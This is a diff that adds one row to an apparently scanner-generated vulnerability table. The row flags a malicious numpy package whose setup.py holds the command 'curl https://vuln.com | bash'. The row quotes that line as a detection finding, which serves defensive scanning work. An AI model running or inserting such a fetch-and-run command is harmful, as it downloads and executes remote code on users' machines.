@@ -143,6 +143,11 @@ Detected 216 vulnerabilities
 |     |                    |                 |                  |       |          | key and index lookups for                                        |
 |     |                    |                 |                  |       |          | django.contrib.postgres.f ...                                    |
 +-----+--------------------+-----------------+------------------+-------+----------+------------------------------------------------------------------+
+| 211 | python3.6 - numpy  | 1.24.2          |                  |   8.5 | high     | Malicious package is detected in                                 |
+|     |                    |                 |                  |       |          | '/usr/local/lib/python3.6/site-packages/numpy/setup.py',         |
+|     |                    |                 |                  |       |          | malicious command "curl https://vuln.com | bash" are             |
+|     |                    |                 |                  |       |          | detected.                                                        |
++-----+--------------------+-----------------+------------------+-------+----------+------------------------------------------------------------------+
 
 ```
 
